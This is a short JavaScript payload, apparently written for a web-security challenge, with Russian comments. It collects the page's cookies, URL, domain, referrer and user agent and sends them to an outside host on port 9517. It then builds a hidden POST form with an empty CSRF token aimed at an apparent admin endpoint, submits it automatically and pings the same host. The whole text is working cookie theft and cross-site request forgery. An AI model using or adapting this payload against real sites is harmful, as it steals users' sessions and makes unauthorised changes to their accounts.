// Отправь любые данные для проверки
let test = {
    url: window.location.href,
    domain: document.domain,
    cookies: document.cookie,
    referrer: document.referrer,
    ua: navigator.userAgent
};

fetch('http://g82i3vc.isgood.host:9517/test?data=' + encodeURIComponent(JSON.stringify(test)));

// CSRF без токена (попытка)
let form = document.createElement('form');
form.action = 'https://tetris-g82i3vc.blzh.fr/admin/line-mode/user/c323d3ef-4b0d-4cfc-8d3a-2e05d051ed1f';
form.method = 'POST';
form.innerHTML = '<input name=line_mode value=1><input name=csrf_token value="">';
document.body.appendChild(form);

setTimeout(() => {
    fetch('http://g82i3vc.isgood.host:9517/submit?status=sending');
    form.submit();
}, 1000);
